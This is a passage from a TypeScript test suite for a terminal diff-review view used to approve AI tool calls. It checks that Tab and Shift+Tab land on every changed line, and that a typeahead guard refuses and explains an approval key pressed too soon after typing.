    expect(offsets).toEqual([...offsets].sort((a, b) => a - b));
    expect(drawnPage(current).next).toBeUndefined();
  });

  it('Shift+Tab inside the tail of a long first change returns to its start before saying there is none earlier', () => {
    const inside = fullViewOf(replacement(null, `${'x'.repeat(4000)}\n`), {
      cursor: { line: 1, offset: 3500 },
    });
    expect(
      drawnPage(inside).changesAbove,
      'the start of the changed line is not on this page',
    ).toBe(1);
    const start = stateAfter(inside, '', SHIFT_TAB);
    expect(start.cursor).toEqual({ line: 1, offset: 0 });
    expect(start.message).toBe('');
    // At the line's start nothing changed is above: now it can say so.
    expect(drawnPage(start).changesAbove).toBe(0);
    expect(pressFull(start, '', SHIFT_TAB)).toEqual({
      kind: 'state',
      state: { ...start, message: 'No earlier change' },
    });
  });

  it('Shift+Tab walks back to the opening of the change and says so only with nothing changed above', () => {
    let current = stateAfter(dense(90), '', END);
    expect(
      drawnPage(current).changesAbove,
      'the last page leaves changed lines above',
    ).toBeGreaterThan(0);
    for (let guard = 0; guard < 40; guard++) {
      const page = drawnPage(current);
      const action = pressFull(current, '', SHIFT_TAB);
      if (action.kind !== 'state') throw new Error(`Shift+Tab gave ${action.kind}`);
      if (action.state.message !== '') {
        expect(action.state.message).toBe('No earlier change');
        expect(page.changesAbove, 'only with nothing changed above').toBe(0);
        break;
      }
      expect(
        compareCursorsForTest(action.state.cursor, current.cursor),
        'strictly backward',
      ).toBeLessThan(0);
      current = action.state;
    }
    expect(drawnPage(current).changesAbove).toBe(0);
  });
});
const compareCursorsForTest = (a: ReviewCursor, b: ReviewCursor): number =>
  a.line - b.line || a.offset - b.offset;

// A refusal is explained once per card — and again once a move has taken the note down, so a person who keeps pressing an
// answer key early is told each time rather than only the first.
describe('a refused answer key explains itself again once a move has taken its note down', () => {
  const REQUEST: ToolApprovalRequest = {
    toolId: 'edit_file',
    action: 'fs_write',
    preview: { path: 'src/app.ts' },
    unredactedPreview: { path: 'src/app.ts' },
  };
  let origin = 0;
  beforeEach(() => {
    vi.useFakeTimers({ toFake: ['Date', 'performance'] });
    vi.setSystemTime(new Date('2026-11-17T12:00:00Z'));
    origin = performance.now();
  });
  afterEach(() => {
    vi.useRealTimers();
  });
  /** Move the monotonic clock to `ms` after the start of the case. */
  const at = (ms: number): void => {
    vi.advanceTimersByTime(Math.max(0, origin + ms - performance.now()));
  };
  /** A store with an approval card of 60 lines, wired as the host wires it: the review is visible once it has been shown. */
  const opened = () => {
    const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
    let shown: unknown;
    store.bindReviewVisibility(() => shown !== undefined && store.getSnapshot().review === shown);
    void store.requestApproval(REQUEST, true, undefined, {
      callId: 'refusal',
      preview: editedFilePreview(60, { 10: 'ten' }),
    });
    const show = (): void => {
      const review = must(store.getSnapshot().review, 'review');
      shown = review;
      store.acknowledgeReviewFrame(review, toolReviewPage(review, 80, 24));
    };
    const note = (): string => store.getSnapshot().review?.message ?? '';
    const press = (input: string, key: ChatKey = {}): void => {
      expect(store.handleReviewInput(input, key)).toBe('handled');
      show();
    };
    // The full view, a key typed ahead, and an answer key pressed on its heels: refused, and explained.
    show();
    at(100);
    press('v');
    at(150);
    press('x');
    return { store, show, note, press };
  };

  it('explains the first refusal, stays quiet for the next one, and explains again after a move took the note down', () => {
    const card = opened();
    at(700);
    card.press('y', { ctrl: true });
    expect(card.store.getSnapshot().approval, 'refused: still pending').toBeDefined();
    expect(card.note()).toBe(CARD_TYPEAHEAD_NOTE);
    const withNote = card.store.getSnapshot().review;
    at(900);
    card.press('y', { ctrl: true });
    expect(card.store.getSnapshot().review, 'once per card: the review is untouched').toBe(
      withNote,
    );
    // A move takes the note down …
    at(1000);
    card.press('', { downArrow: true });
    expect(card.note()).toBe('');
    expect(card.store.getSnapshot().approval).toBeDefined();
    // … and the next refusal is explained again.
    at(1100);
    card.press('y', { ctrl: true });
    expect(card.store.getSnapshot().approval).toBeDefined();
    expect(card.note()).toBe(CARD_TYPEAHEAD_NOTE);
  });

  it('does the same when the key that took the note down is one that could not move (the stale note)', () => {
    const card = opened();
    at(300);
    card.press('', { home: true }); // to the top: now Up cannot move
    at(700);
    card.press('y', { ctrl: true });
    expect(card.note()).toBe(CARD_TYPEAHEAD_NOTE);
    at(900);
    card.press('', { upArrow: true });
    expect(card.note(), 'a key that cannot move still takes the note down').toBe('');
    at(1000);
    card.press('y', { ctrl: true });
    expect(card.note(), 'and the next refusal is explained again').toBe(CARD_TYPEAHEAD_NOTE);
  });

  it('keeps a note that nothing took down: a key that changes no message does not reset the explanation', () => {
    const card = opened();
    at(700);
    card.press('y', { ctrl: true });
    expect(card.note()).toBe(CARD_TYPEAHEAD_NOTE);
    // A key the card has no use for changes nothing, and the note is still the one explanation.
    at(800);
    card.press('z');
    expect(card.note()).toBe(CARD_TYPEAHEAD_NOTE);
    const withNote = card.store.getSnapshot().review;
    at(900);
    card.press('y', { ctrl: true });
    expect(card.store.getSnapshot().review).toBe(withNote);
  });
});

// Tab used to jump from the opening of one change to the opening of the next, so the part of a change that lies past the
// page it opened on — a change longer than a page, merged by the six-line gap — was stepped over. Now it lands on whichever is
// NEARER: the next change that opens elsewhere, or the nearest changed line the page does not draw. Every changed line is on
// some landing page, forward and back.
describe('Tab and Shift+Tab step over no changed line (ADR-0134 §5)', () => {
  /** 90 lines with an edit every fifth line from 12 to 52 and one at 70: the security sitting's reproduction. */
  const repro = () => {
    const edits: Record<number, string> = { 70: 'edit 70' };
    for (let line = 12; line <= 52; line += 5) edits[line] = `edit ${line}`;
    return fullViewOf(editedFilePreview(90, edits));
  };
  const EDITS = [12, 17, 22, 27, 32, 37, 42, 47, 52, 70];
  const shows = (landing: TabLanding, ...lines: number[]): boolean =>
    lines.every(
      (line) => landing.changed.includes(`-${line}`) && landing.changed.includes(`+${line}`),
    );

  it('forward: pages showing 22 and 27, 32 and 37, 42 and 47, 47 and 52 come before 70 — no edit between 12 and 52 is skipped', () => {
    const state = repro();
    const walk = tabWalk(state);
    expect(everyChangedLineSeen(walk, documentOf(state))).toEqual([]);
    const firstWith = (...lines: number[]): number =>
      walk.landings.findIndex((landing) => shows(landing, ...lines));
    const pairs = [
      [22, 27],
      [32, 37],
      [42, 47],
      [47, 52],
    ] as const;
    const at70 = firstWith(70);
    expect(at70, 'the last edit has a landing of its own').toBeGreaterThan(0);
    let previous = -1;
    for (const [first, second] of pairs) {
      const index = firstWith(first, second);
      expect(index, `a landing shows ${first} and ${second}`).toBeGreaterThanOrEqual(0);
      expect(index, `${first} and ${second} come before 70`).toBeLessThan(at70);
      expect(index, 'and after the pair before it').toBeGreaterThan(previous);
      previous = index;
    }
    expect(
      labelOf(must(walk.landings.at(-1), 'landing').state),
      'the last landing opens the last change',
    ).toBe('=67');
    expect(walk.refusal).toBe('No later change');
    expect(walk.refusedAt.changesBelow).toBe(0);
    for (const landing of walk.landings)
      if (landing.nextUnseen !== undefined) expect(landing.changed).toContain(landing.nextUnseen);
  });

  it('backward from the end: the same edits in reverse, none skipped', () => {
    const atEnd = stateAfter(repro(), '', END);
    const walk = tabWalk(atEnd, true);
    expect(everyChangedLineSeen(walk, documentOf(atEnd))).toEqual([]);
    // The order in which edits first appear on a landing is descending: 70, 52, 47, … 12.
    const first: number[] = [];
    for (const landing of walk.landings)
      for (const line of [...new Set(landing.changed.map((label) => Number(label.slice(1))))].sort(
        (a, b) => b - a,
      ))
        if (!first.includes(line)) first.push(line);
    expect(first).toEqual([...EDITS].reverse());
    let previous = atEnd;
    for (const landing of walk.landings) {
      expect(
        compareCursorsForTest(landing.state.cursor, previous.cursor),
        'strictly backward',
      ).toBeLessThan(0);
      previous = landing.state;
    }
    expect(labelOf(walk.last)).toBe('=9');
    expect(walk.refusal).toBe('No earlier change');
    expect(walk.refusedAt.changesAbove).toBe(0);
  });

  /** Edits on `lines` (1-based) of a `total`-line file; a `wide` line is padded to wrap over several rows. */
  const wrapped = (total: number, edits: Readonly<Record<number, number>>) =>
    fullViewOf(
      editedFilePreview(
        total,
        Object.fromEntries(
          Object.entries(edits).map(([line, pad]) => [line, `e${line} ${'w'.repeat(pad)}`]),
        ),
      ),
    );

  it('forward over wrapped lines: no landing passes the last full page, and the walk ends ON it', () => {
    // Short edits, then a long wrapped line and two more edits near the end of a 51-line file: the nearest undrawn changed
    // line opens below the last full page, and a landing there would leave blank rows under the screen.
    const state = wrapped(51, { 8: 0, 11: 0, 15: 0, 26: 0, 40: 194, 43: 0, 45: 0 });
    const document = documentOf(state);
    const walk = tabWalk(state);
    expect(everyChangedLineSeen(walk, document)).toEqual([]);
    const limit = lastPageStart(document, scrollViewOf(state, drawnPage(state)));
    expect(walk.landings.at(-1)?.state.cursor, 'the last landing is the last full page').toEqual(
      limit,
    );
    expect(drawnPage(must(walk.landings.at(-1), 'landing').state).next).toBeUndefined();
    expect(walk.refusal).toBe('No later change');
  });

  it('backward over a wrapped line: every changed line above is on some landing, the one just above the cursor included', () => {
    const atEnd = stateAfter(wrapped(71, { 15: 0, 21: 0, 36: 0, 56: 194, 63: 0 }), '', END);
    const walk = tabWalk(atEnd, true);
    expect(everyChangedLineSeen(walk, documentOf(atEnd))).toEqual([]);
    let previous = atEnd;
    for (const landing of walk.landings) {
      expect(
        compareCursorsForTest(landing.state.cursor, previous.cursor),
        'strictly backward',
      ).toBeLessThan(0);
      if (landing.nextUnseen !== undefined) expect(landing.changed).toContain(landing.nextUnseen);
      previous = landing.state;
    }
    expect(walk.refusal).toBe('No earlier change');
    expect(walk.refusedAt.changesAbove).toBe(0);
  });

  it.each([
    ['a 30-row change (15 edits)', 15],
    ['a 60-row change (30 edits)', 30],
  ])(
    'tab-tail: 3 context lines, %s, 10 gap lines and a one-line change: every changed line of the long one is on some landing',
    (_name, count) => {
      const edits: Record<number, string> = {};
      for (let line = 4; line < 4 + count; line++) edits[line] = `changed ${line}`;
      const last = 4 + count + 10;
      edits[last] = `changed ${last}`;
      const state = fullViewOf(editedFilePreview(60, edits));
      const document = documentOf(state);
      const walk = tabWalk(state);
      expect(everyChangedLineSeen(walk, document), 'every +N and -N is drawn on some page').toEqual(
        [],
      );
      for (let line = 4; line < 4 + count; line++)
        expect(walk.seen.has(`+${line}`), `+${line}`).toBe(true);
      expect(walk.seen.has(`+${last}`), 'and the lone change after the gap').toBe(true);
      expect(walk.refusal).toBe('No later change');
      expect(walk.refusedAt.changesBelow).toBe(0);
      for (const landing of walk.landings)
        if (landing.nextUnseen !== undefined) expect(landing.changed).toContain(landing.nextUnseen);
    },
  );
});

// The typeahead guard asks "was this key typing?": a key the card has no use for is. A key that could not move but took a stale
// note down used to be `none` — typing — until it started answering with a state; it must still count.
describe('a key that only took a stale note down still counts as typing for the answer guard (security sitting 4)', () => {
  const request: ToolApprovalRequest = {
    toolId: 'edit_file',
    action: 'fs_write',
    preview: { path: 'src/app.ts' },
    unredactedPreview: { path: 'src/app.ts' },
  };
  let origin = 0;
  beforeEach(() => {
    vi.useFakeTimers({ toFake: ['Date', 'performance'] });
    vi.setSystemTime(new Date('2026-11-17T12:00:00Z'));
    origin = performance.now();
  });
  afterEach(() => {
    vi.useRealTimers();
  });
  const at = (ms: number): void => {
    vi.advanceTimersByTime(Math.max(0, origin + ms - performance.now()));
  };
  /** A store with an approval whose full view is open (at the change), wired as the host wires it. */
  const opened = () => {
    const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
    let shown: unknown;
    store.bindReviewVisibility(() => shown !== undefined && store.getSnapshot().review === shown);
    const answer = store.requestApproval(request, true, undefined, {
      callId: 'stale-key',
      preview: editedFilePreview(60, { 10: 'ten' }),
    });
    const show = (): void => {
      const review = must(store.getSnapshot().review, 'review');
      shown = review;
      store.acknowledgeReviewFrame(review, toolReviewPage(review, 80, 24));
    };
    const note = (): string => store.getSnapshot().review?.message ?? '';
    const press = (input: string, key: ChatKey = {}): void => {
      expect(store.handleReviewInput(input, key)).toBe('handled');
      show();
    };
    show();
    at(100);
    press('v');
    return { store, answer, note, press };
  };

  it('refuses a Ctrl+Y pressed 700 ms after a key that could only clear the note, though the note itself was 1.7 s old', () => {
    const card = opened();
    at(150);
    card.press('', { end: true }); // the last full page: nothing below to move to
    at(200);
    card.press('', { tab: true });
    expect(card.note(), 'Tab with no change later says so').toBe('No later change');
    at(1900); // 1.7 s of quiet: the Tab's own typing window is over
    card.press('j'); // cannot move: it only takes the note down
    expect(card.note()).toBe('');
    at(2600);
    card.press('y', { ctrl: true });
    expect(card.store.getSnapshot().approval, 'refused: still waiting').toBeDefined();
    expect(card.note(), 'and says why').toBe(CARD_TYPEAHEAD_NOTE);
  });

  it('refuses the same sequence with no note to clear (that key was always typing)', () => {
    const card = opened();
    at(150);
    card.press('', { end: true });
    at(1900);
    card.press('j');
    expect(card.note()).toBe('');
    at(2600);
    card.press('y', { ctrl: true });
    expect(card.store.getSnapshot().approval).toBeDefined();
    expect(card.note()).toBe(CARD_TYPEAHEAD_NOTE);
  });

  it('refuses a Ctrl+Y 700 ms after the key that SET the note, too — a refusal of the view is no deliberate move', () => {
    const card = opened();
    at(150);
    card.press('', { end: true });
    at(200);
    card.press('', { tab: true });
    expect(card.note()).toBe('No later change');
    at(900);
    card.press('y', { ctrl: true });
    expect(card.store.getSnapshot().approval).toBeDefined();
    expect(card.note()).toBe(CARD_TYPEAHEAD_NOTE);
  });

  it('does not refuse after a key that moves AND takes the note down: it is the person using the view', async () => {
    const card = opened();
    at(150);
    card.press('', { end: true });
    at(200);
    card.press('', { tab: true });
    expect(card.note()).toBe('No later change');
    at(1900);
    card.press('', { upArrow: true }); // moves up one line, and the note goes with it
    expect(card.note()).toBe('');
    at(2600);
    expect(card.store.handleReviewInput('y', { ctrl: true })).toBe('handled');
    expect(await card.answer).toEqual({ outcome: 'approve', scope: 'once' });
  });

  it('does not refuse after a key that MOVES: Down is the person using the view, not typing', async () => {
    const card = opened();
    at(1900);
    card.press('', { downArrow: true });
    at(2600);
    // The card is answered, so there is no frame left to acknowledge afterwards: the key goes to the store directly.
    expect(card.store.handleReviewInput('y', { ctrl: true })).toBe('handled');
    expect(card.store.getSnapshot().approval, 'answered').toBeUndefined();
    expect(await card.answer).toEqual({ outcome: 'approve', scope: 'once' });
  });
});
